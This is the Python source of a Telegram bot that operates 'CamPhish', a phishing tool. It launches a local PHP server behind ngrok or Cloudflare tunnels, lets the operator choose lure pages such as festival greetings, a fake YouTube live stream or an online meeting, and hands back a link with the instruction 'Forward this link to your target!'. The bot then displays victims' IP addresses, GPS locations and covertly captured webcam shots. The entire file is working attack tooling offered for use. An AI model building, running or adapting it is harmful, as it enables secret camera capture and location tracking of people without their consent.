import asyncio
import logging
import os
import re
import signal
import subprocess
import sys
import tempfile
import traceback
from pathlib import Path

from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

env_path = Path(__file__).resolve().parent / ".env"
if env_path.exists():
    for line in env_path.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
BASE_DIR = Path(__file__).resolve().parent

HOME_KB = ReplyKeyboardMarkup(
    [["🔥 Start CamPhish"], ["📝 View Saved Data"], ["🧹 Clean Up"], ["❓ Help"]],
    resize_keyboard=True,
)
TUNNEL_KB = ReplyKeyboardMarkup(
    [["🌐 Ngrok"], ["☁️ CloudFlare Tunnel"], ["⬅️ Back"]], resize_keyboard=True,
)
TEMPLATE_KB = ReplyKeyboardMarkup(
    [["🎉 Festival Wishing"], ["📺 Live YouTube TV"], ["👥 Online Meeting"], ["⬅️ Back"]],
    resize_keyboard=True,
)
BACK_KB = ReplyKeyboardMarkup([["⬅️ Back"]], resize_keyboard=True, one_time_keyboard=True)

user_state: dict[int, dict] = {}

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "CamPhish Telegram Bot v2.0\n\n"
        "Grab cam shots from target's phone front camera or PC webcam\n"
        "just sending a link with GPS location tracking!\n\n"
        "Select an option below to get started:",
        reply_markup=HOME_KB,
    )

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    uid = update.effective_user.id
    state = user_state.get(uid, {})

    if text in ("⬅️ Back", "/start"):
        user_state.pop(uid, None)
        await update.message.reply_text("Select an option:", reply_markup=HOME_KB)
        return

    if text == "🔥 Start CamPhish":
        user_state[uid] = {}
        await update.message.reply_text("Select tunnel server:", reply_markup=TUNNEL_KB)
        return

    if text == "📝 View Saved Data":
        lines = []
        ip_file = BASE_DIR / "ip.txt"
        if ip_file.exists():
            lines.append(f"IP Addresses:\n{ip_file.read_text()}")
        loc_file = BASE_DIR / "current_location.txt"
        if loc_file.exists():
            lines.append(f"Current Location:\n{loc_file.read_text()}")
        cam_files = list(BASE_DIR.glob("cam*.png"))
        if cam_files:
            lines.append(f"Cam shots captured: {len(cam_files)}")
        msg = "\n\n".join(lines) if lines else "No saved data found."
        await update.message.reply_text(msg, reply_markup=HOME_KB)
        return

    if text == "🧹 Clean Up":
        await update.message.reply_text("Cleaning up temporary files...")
        subprocess.run(["bash", str(BASE_DIR / "cleanup.sh")], cwd=BASE_DIR, capture_output=True, timeout=10)
        await update.message.reply_text("Cleanup completed!", reply_markup=HOME_KB)
        return

    if text == "❓ Help":
        await update.message.reply_text(
            "CamPhish Bot Help\n\n"
            "Commands: /start - Show main menu\n\n"
            "Features:\n"
            "• Select tunnel server (Ngrok/CloudFlare)\n"
            "• Choose template (Festival/YouTube/Meeting)\n"
            "• View captured data\n"
            "• Clean up logs\n\n"
            "Note:\n"
            "• Keep your Ngrok authtoken configured\n"
            "• Response may take 15-30 seconds\n"
            "• All captured data is saved locally",
            reply_markup=HOME_KB,
        )
        return

    if text == "🌐 Ngrok":
        user_state[uid] = {"tunnel": "ngrok"}
        await update.message.reply_text("Selected Ngrok. Choose a template:", reply_markup=TEMPLATE_KB)
        return

    if text == "☁️ CloudFlare Tunnel":
        user_state[uid] = {"tunnel": "cloudflare"}
        await update.message.reply_text("Selected CloudFlare Tunnel. Choose a template:", reply_markup=TEMPLATE_KB)
        return

    if text == "🎉 Festival Wishing":
        user_state[uid] = {**state, "stage": "festival_name"}
        await update.message.reply_text("Enter the festival name:", reply_markup=BACK_KB)
        return

    if text == "📺 Live YouTube TV":
        user_state[uid] = {**state, "stage": "yt_id"}
        await update.message.reply_text("Enter YouTube video/watch ID:", reply_markup=BACK_KB)
        return

    if text == "👥 Online Meeting":
        tunnel = state.get("tunnel", "ngrok")
        await update.message.reply_text("Starting Online Meeting...", reply_markup=HOME_KB)
        user_state.pop(uid, None)
        asyncio.create_task(run_camphish(uid, ctx, tunnel, "3"))
        return

    stage = state.get("stage")
    if stage == "festival_name":
        name = text.strip().replace(" ", "")
        if name:
            tunnel = state.get("tunnel", "ngrok")
            await update.message.reply_text(f"Starting with festival: {name}", reply_markup=HOME_KB)
            user_state.pop(uid, None)
            asyncio.create_task(run_camphish(uid, ctx, tunnel, "1", fest_name=name))
        else:
            await update.message.reply_text("Enter a valid festival name:")
        return

    if stage == "yt_id":
        yt_id = text.strip()
        if yt_id:
            tunnel = state.get("tunnel", "ngrok")
            await update.message.reply_text(f"Starting with YouTube ID: {yt_id}", reply_markup=HOME_KB)
            user_state.pop(uid, None)
            asyncio.create_task(run_camphish(uid, ctx, tunnel, "2", yt_id=yt_id))
        else:
            await update.message.reply_text("Enter a valid YouTube video ID:")
        return

    await update.message.reply_text("Use the menu buttons or type /start", reply_markup=HOME_KB)

def kill_processes():
    for name in ("ngrok", "cloudflared", "php"):
        for cmd in (["pkill", "-f", name], ["killall", name]):
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

def run_camphish_sync(tunnel: str, template: str, fest_name=None, yt_id=None) -> str:
    tunnel_choice = "2" if tunnel == "cloudflare" else "1"
    inputs = [tunnel_choice, template]
    if template == "1" and fest_name:
        inputs.append(fest_name)
    elif template == "2" and yt_id:
        inputs.append(yt_id)
    inputs += ["n", "", "", ""]
    input_text = "\n".join(inputs) + "\n"

    kill_processes()

    with tempfile.NamedTemporaryFile(mode="w", suffix=".in", delete=False) as f_in:
        f_in.write(input_text)
        in_path = f_in.name
    out_path = in_path.replace(".in", ".out")

    try:
        with open(in_path) as f_in_fh, open(out_path, "w") as f_out_fh:
            proc = subprocess.Popen(
                ["bash", str(BASE_DIR / "camphish.sh")],
                stdin=f_in_fh,
                stdout=f_out_fh,
                stderr=subprocess.STDOUT,
                cwd=BASE_DIR,
                preexec_fn=os.setsid,
            )

        try:
            proc.wait(timeout=60)
        except subprocess.TimeoutExpired:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                proc.wait()

        with open(out_path) as f:
            output = f.read()

        m = re.search(r"https://[^\s]+\.(?:ngrok-free\.app|trycloudflare\.com)", output)
        if m:
            return m.group(0).rstrip(".")

        # No link found - return the output for diagnostics
        clean = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", output)
        return f"NO_LINK_FOUND:\n{clean[-1500:]}"

    finally:
        for p in (in_path, out_path):
            try:
                os.unlink(p)
            except OSError:
                pass

async def run_camphish(uid: int, ctx: ContextTypes.DEFAULT_TYPE, tunnel: str, template: str, fest_name=None, yt_id=None):
    notify = lambda msg: ctx.application.bot.send_message(uid, msg)
    await notify("Starting CamPhish...\nStarting PHP server and tunnel...\nThis may take up to 60 seconds...")

    try:
        result = await asyncio.get_event_loop().run_in_executor(
            None, run_camphish_sync, tunnel, template, fest_name, yt_id
        )

        if result.startswith("NO_LINK_FOUND"):
            await notify(f"⚠️ Could not find tunnel link. Last output:\n<code>{result[14:]}</code>")
        else:
            await notify(f"CAMPHISH LINK:\n\n{result}")
            await notify("Forward this link to your target!")

    except Exception as e:
        tb = traceback.format_exc()
        await notify(f"⚠️ Error: {e}\n\n<code>{tb[:2000]}</code>")

async def error_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    log.error("Exception: %s", ctx.error)

def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set TELEGRAM_BOT_TOKEN environment variable")
        print("   Create a .env file with: TELEGRAM_BOT_TOKEN=your_token")
        print("   Get token from: https://t.me/BotFather")
        sys.exit(1)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)

    signal.signal(signal.SIGINT, lambda *_: app.stop())
    signal.signal(signal.SIGTERM, lambda *_: app.stop())

    print("✅ CamPhish Bot started! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
